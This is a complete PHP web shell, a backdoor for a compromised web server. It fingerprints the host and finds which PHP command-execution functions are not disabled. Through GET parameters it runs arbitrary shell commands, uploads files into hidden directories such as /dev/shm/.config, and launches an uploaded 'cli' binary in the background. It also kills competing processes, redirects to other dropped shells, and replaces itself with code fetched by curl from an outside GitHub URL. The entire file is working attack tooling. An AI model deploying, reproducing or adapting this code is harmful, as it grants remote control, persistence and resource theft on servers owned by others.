<?php 
ini_set('max_execution_time', 0);
//error_reporting(0);

$funclist=array('shell_exec','system','passthru','proc_open','popen','exec');
$fncmaster="";

$host=$_SERVER['SERVER_NAME'];
$hostaddr=$_SERVER['SERVER_ADDR'];
$clientip=$_SERVER['REMOTE_ADDR'];
if($host=="0") $host=$_SERVER['HTTP_HOST'];
if($hostaddr=="") $hostaddr="unknown";

//echo "<pre>";print_r($_SERVER);
//die("h=$hostaddr");

echo '<title>INFO: ' . $host . '</title>';
if (php_sapi_name()!=='cli')
    echo "<pre>\n";


$upload_cli="/dev/shm/.config";
if(!file_exists($upload_cli)) {
    @mkdir($upload_cli);
    if(!file_exists($upload_cli)) {
        $upload_cli=".cfg";
        if(!file_exists($upload_cli)) {
            @mkdir($upload_cli);
            if(!file_exists($upload_cli))
                $upload_cli="";
        }
    }
}

if ($upload_cli="/dev/shm/.config") {
    $upload_dir=".cfg";
    if(!file_exists($upload_dir)) {
        @mkdir($upload_dir);
        if(!file_exists($upload_dir))
            $upload_dir="";
    }
} else
    $upload_dir=$upload_cli;


// if($upload_dir!="" && file_exists("-")) {
//     exe("mv -/* $upload_dir");
// }

//echo("updir: $upload_dir\n");
//echo("upcli: $upload_cli");

//print_r($_SERVER);die();
$killclis= <<<term
pkil=$(ps -ux | grep "/cli"  | awk '{print $2}' | sort | uniq | egrep -v '^1$'); echo "\$pkil" | xargs kill -9
term;
$killdfu = <<<term
pdfu=$(ps -ef | grep [d]efunct  | awk '{print $3}' | sort | uniq | egrep -v '^1$'); echo "\$pdfu" | xargs kill -9
term;

get_cpu_info();

$tmp=$_SERVER['REQUEST_URI'];

$p=strripos($tmp,"/");
$link=substr($tmp,0,$p) . "/$upload_dir";
$a=Array();$b=Array();

if(isset($_GET["upd"])) {

    $oldfile=$_SERVER['PHP_SELF'];
    $p=strripos($oldfile,"/");
    $oldfile=substr($oldfile,$p+1);

    $new="upd-$oldfile";
    $cmd="curl -s https://raw.githubusercontent.com/siwap/my-fav-web/main/mylop.txt -o $new";
    echo "$cmd\n";
    exe($cmd);
    exe("ls -al");
    if(file_exists($new) && filesize($new)>15000) {
        chmod($oldfile,"0644");
        $ret=rename($new,$oldfile);
        if($ret) {
            echo("\nUPDATE SUCCESS!\n");
            chmod($oldfile,"0444");
        }
        else echo("\nUPDATE FAILED!\n");
    } else
    echo("\nDOWNLOAD FAILED!\n");

    die("\ndone!");
} 


if(isset($_GET["ps"])) 
{
    echo exe("ps -ux");
    die("\ndone!");
} else
if(isset($_GET["ls"])) {
    echo exe("ls -al");
    die("\ndone!");
} else
if(isset($_GET["run"])) {
    $shell_user = posix_getpwuid($uid);
    $home_dir = posix_getpwuid(getmyuid())['dir'];

    $checkfile="$upload_cli/.pki/run";
    if(!file_exists($checkfile)) $checkfile="$home_dir/etc/.pki/run";
    echo "target: $checkfile\n";

    if(file_exists($checkfile)) {
        chdir(substr($checkfile,0,-3));
        echo "running [app]..." . PHP_EOL;
        exe("./run");
        die("\ndone!");
    } else
        die("ERROR: [app] not available!");

} else
if(isset($_GET["dfu"])) 
{
    echo "\nkill all defunc process\n";
    exe($killdfu);
    echo exe("ps -ux");
    die("\ndone!");
} else
if(isset($_GET["kil"])) {
    echo "\nkill all cli process\n";
    die();
    
    exe($killclis);
    exe($killdfu);
    echo exe("ps -ux");
    die("\ndone!");
}
else if(isset($_GET["cli"])) {
    if(file_exists("$upload_cli/cli")) {
        exe($killclis);
        chmod("$upload_cli/cli",0755);
        
        $cmd="setsid $upload_cli/cli &";
        echo "running cli..." . PHP_EOL;
        
        exe($cmd);
        exe($killdfu);
        die("\ndone!");
    } else 
        die("ERROR: cli not found!");
} else
if(isset($_GET["cmd"])) {
    $tmp=$_SERVER['REQUEST_URI'];$p=strpos($tmp,"=");
    $cmd=substr($tmp,$p+1);
    $cmd=rawurldecode($cmd);
//    $cmd=$_GET["cmd"];
    echo "> $cmd\n";
    if($cmd!="") {
        $outp = exe($cmd);
        echo $outp;
        die("\ndone!");
    }
} else
if(isset($_GET["shl"])) {
    $list=glob("$upload_dir/*.php");
//    print_r($list);
    $n=count($list);
    if($n==0) die("ERROR: no shl found!");
    $no=mt_rand(0,$n-1);
    $target=$list[$no];
?>

<script>location.href="<?php echo $target; ?>"</script>
<?php
    die("\ndone!");
}

if(!isset($_GET["upl"])) die();
if($upload_dir=="") {
    die("no upload dir!");
}

echo "<form method='POST' enctype='multipart/form-data'><input type='file' name='file' /> <input type='submit' value='upload' /></form><pre>";
$tmp = $_FILES['file']['tmp_name'];
if ($tmp != "") {
    $tmp2 = $_FILES['file']['name'];
    $link = "$link/$tmp2";
    if($tmp2=="cli")
        $tmp3 = "$upload_cli/$tmp2";
    else
        $tmp3 = "$upload_dir/$tmp2";
        
    if(file_exists($tmp3)) echo "File will be overwritten\n";
    $ret = move_uploaded_file($tmp, $tmp3);
    if($ret) {
        if($tmp2=="cli")
            echo "uploaded to $tmp3\n";
        else
            echo "uploaded to <a href='$link'>$link</a>\n";
    }
    else 
       die("ERROR: upload failed!");

   die("\ndone!");
}

function get_cpu_info() 
{
    $available = Array();
    global $host,$hostaddr,$clientip,$funclist,$fncmaster;

    $disb = trim(ini_get("disable_functions"));
    if($disb=='') {
        $disb = "none";
        $fncmaster = "shell_exec";
    }
    else {
        $disb=str_ireplace(chr(32),'',$disb);
        $disable_functions = explode(",",$disb);
       // echo "disable:\n";
        //print_r($disable_functions);

        //echo "function list:\n";
        //print_r($funclist);

        $available = array_diff($funclist,$disable_functions);
        //echo "available:\n";
        //print_r($available);

        foreach($available as $func) {
            $fncmaster=$func;
            break;
        }
    }

    // $fncmaster = "popen";
//    if($fncmaster!="")
 //       echo "USING: $fncmaster\n";
 //   else
    if($fncmaster=="")
        echo "All OS functions disabled!\n";

    if($disb!="")
        echo("disable_functions = $disb\n");
        
    if($fncmaster!="")
    {
            //$disb=substr($disb,0,47); if (strlen($disb)>=47) $disb.="...";
            //$disb="[$disb]";
            
            $TPROC=get_processor($MODEL);
            
            //$MODEL=exe("echo -n $(head /proc/cpuinfo -n 10 | grep 'model name' | sed 's/model name//' | cut -b4-)");
            //$MODEL=str_ireplace(chr(10),'',$MODEL);$MODEL=str_ireplace(chr(13),'',$MODEL);
            
            //$uname=exe("echo -n $(uname -n)");
            $uname=php_uname("n");
            //$uptime=exe("echo -n $(uptime)");
            $uptime=getUptime();
            //$uptime=str_ireplace(chr(10),'',$uptime);$uptime=str_ireplace(chr(13),'',$uptime);
            $uptime="UPTIME > $uptime";
            
            //. substr($uptime,12);
            //$whoami=exe("id");
            $whoami=fwhoami();
            $totmem=get_total_mem();

            // $lines = str_repeat("=",50) . " $disb ";
            // $n2 = 100 - strlen($lines);
            // $line2 = $lines;
            // if($n2>0) $line2 .= str_repeat("=",$n2); else $line2 .= "===";
            //echo "$line2\n";
            echo str_repeat('=',100); 
            echo "\n$uname > $host ($hostaddr) | CLIENTIP: $clientip\n";
            echo "[ $TPROC ] $MODEL - $totmem\n\n";

            echo php_uname("s") . " ". php_uname("r") . " " . php_uname("v") . "\n";
            echo "   $uptime\n";
            echo "   WHOAMI > $whoami\n";
            echo str_repeat('=',95) . " v0.27\n";
    }

    echo "PWD: " . getcwd() . "\n\n";
}

function get_total_mem() {

    //exe("echo -n $(free -m |  grep 'Mem:' | cut -b 10-20 | grep -o '[[:digit:]]*');");
    $info=file_get_contents("/proc/meminfo");
    $info=floatval(trim(substr($info,12)))/1000;
    $totmem=$info;
    
    if(intval($totmem>=1000)) {
        $totmem = "[ " . number_format(intval($totmem)/1000.0,1) . " GiB ] Total Memory";
    } else
        $totmem = "[ " . number_format($totmem,0) . " MiB ] Total Memory";

    return $totmem;
}

function get_processor(&$model) {
    $info=file_get_contents("/proc/cpuinfo");
    $total=explode("processor",$info);
    $total=count($total);
    $model="gembel";
    
    $p=stripos($info,"model name	:");
    $p=$p+strlen("model name	:");
    $q=stripos($info,chr(10),$p);
    $model = trim(substr($info,$p,$q-$p));

    if($total<2) return "n/a";
    else return $total-1;
}

function fwhoami() {
    
    $userInfo = posix_getpwuid(posix_getuid());
    $user = $userInfo['name'];    
    $groupInfo = posix_getgrgid(posix_getgid());
    $group = $groupInfo = $groupInfo['name'];

    return "$user ($group)";
}


function getUptime() {
        $str   = @file_get_contents('/proc/uptime');
        $num   = floatval($str);
        $secs  = $num % 60;
        $num   = (int)($num / 60);
        $mins  = $num % 60;
        $num   = (int)($num / 60);
        $hours = $num % 24;
        $num   = (int)($num / 24);
        $days  = $num;

        return "$days days $hours hours $mins mins";
        
        // return array(
        //     "days"  => $days,
        //     "hours" => $hours,
        //     "mins"  => $mins,
        //     "secs"  => $secs
        // );
    }


function exe($cmd)
{
    global $fncmaster;
    $sc=$cmd;
    $retvalue="";

	switch ($fncmaster) {
		case "system":
            ob_start();
            system($sc);
            $retvalue = ob_get_contents();
            ob_end_clean(); 
           break;

        case "passthru":
            ob_start();
            passthru($sc);
            $retvalue = ob_get_contents();
            ob_end_clean(); 
           break;

        case "shell_exec":
			$retvalue = shell_exec($sc);
           break;

        case "exec":
            $r = NULL;
            exec($sc,$r);
			if (is_array($r)) {
			 	foreach ($r as $v)
                     $retvalue .= "$v\n";
            }
            //$retvalue .= "\n";
            //$retvalue=substr($retvalue,0,-1);
           break;

        case "popen":
			if ($h = popen($sc, 'r')) {
				while (!feof($h)) {
					$retvalue .= fread($h, 1024);
                }
				pclose($h);
			}
           break;

        case "proc_open":
            if($h = proc_open($sc,array(array('pipe','r'), array('pipe','w'), array('pipe','a')),$p)){
                $retvalue = stream_get_contents($p[1]);
				fclose($p[0]);
				fclose($p[1]);
				proc_close($h);
			}
           break;

        case "windows":
			//if ($h = new COM('WScript.Shell'))
			//	echo $h->Exec(($sh === '' ? 'cmd' : $sh) . ' /C ' . $cmd . ' ' . $se)->StdOut->ReadAll();
			break;

        default: 
            die("error $fncmaster");
	}

    $final = htmlentities($retvalue);
    //if($fncmaster!="exec" && $fncmaster!="passthru")
      //  echo $final;
    return $final;
}
